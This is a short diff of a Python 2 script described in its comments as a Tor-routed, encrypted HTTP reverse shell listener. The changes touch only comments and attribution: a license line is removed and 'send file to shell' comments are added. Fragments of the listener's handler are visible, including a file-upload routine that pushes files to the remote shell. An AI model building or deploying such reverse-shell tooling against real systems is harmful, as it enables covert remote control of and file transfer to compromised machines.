@@ -1,7 +1,6 @@
 #!/usr/bin/python
 
 #   Author = j0lly
-#   BSD License
 #
 #   this code is an enanchment of an http encrypted reverse python shell and listener from:
 #
@@ -10,7 +9,7 @@
 #   most of the code come from him, I've just lean it and added the option to work with tor network.
 #   The idea of a toryfied connection like this is not mine either, but come from:
 #
-#        Xavier Garcia http://www.shellguardians.com
+#        Xavier Garcia (shellguardians) http://www.shellguardians.com
 #
 
 from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer
@@ -39,6 +38,7 @@ class GetHandler(BaseHTTPRequestHandler):
 
                 else: print "file does not exist"
 
+        # send file to shell
         def upload_file(self,doc):
                 if doc=="":
                     print "We need a file as a parameter"
@@ -61,6 +61,7 @@ class GetHandler(BaseHTTPRequestHandler):
         	self.send_response(200)
 		# end headers
         	self.end_headers()
+                #send file to shell
                 if message[0:6] == "upload" :
                     message = "upload %s" % self.upload_file(message[7:])
 		# base64 it
